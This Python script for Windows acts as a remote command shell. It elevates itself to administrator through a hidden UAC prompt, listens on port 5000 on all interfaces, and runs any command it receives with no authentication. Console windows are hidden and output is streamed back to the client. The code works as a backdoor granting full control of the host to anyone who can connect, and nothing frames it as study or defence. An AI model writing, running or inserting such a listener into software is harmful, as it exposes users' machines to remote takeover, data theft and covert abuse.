import socket
import subprocess
import os
import sys
import time
import ctypes

os.chdir(os.path.dirname(os.path.abspath(sys.argv[0])))

def is_admin():
    try: return ctypes.windll.shell32.IsUserAnAdmin()
    except: return False

def start_server():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{sys.argv[0]}"', None, 0)
        sys.exit()

    time.sleep(2)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try: s.bind(('0.0.0.0', 5000))
        except: sys.exit()
        s.listen(5)

        while True:
            try:
                conn, addr = s.accept()
                with conn:
                    conn.sendall(f"Standard Mode Ready.\n{os.getcwd()}>".encode('cp932'))
                    while True:
                        data = conn.recv(8192)
                        if not data: break
                        cmd = data.decode('cp932', errors='replace').strip()
                        if cmd.lower() == "exit": break
                        
                        if cmd.lower().startswith("cd "):
                            try: os.chdir(cmd[3:].strip())
                            except: pass
                            conn.sendall(f"\n{os.getcwd()}>".encode('cp932'))
                            continue

                        si = subprocess.STARTUPINFO()
                        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                        
                        # bufsize=0 でバッファリングを無効化
                        proc = subprocess.Popen(
                            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                            shell=True, startupinfo=si, bufsize=0
                        )

                        # 1バイトでもデータが来たら即座にクライアントへ横流しする
                        while True:
                            chunk = proc.stdout.read(1) # 1バイトずつ読み取り
                            if not chunk and proc.poll() is not None:
                                break
                            if chunk:
                                conn.sendall(chunk)

                        proc.wait()
                        conn.sendall(f"\n{os.getcwd()}>".encode('cp932'))
            except: continue

if __name__ == "__main__":
    start_server()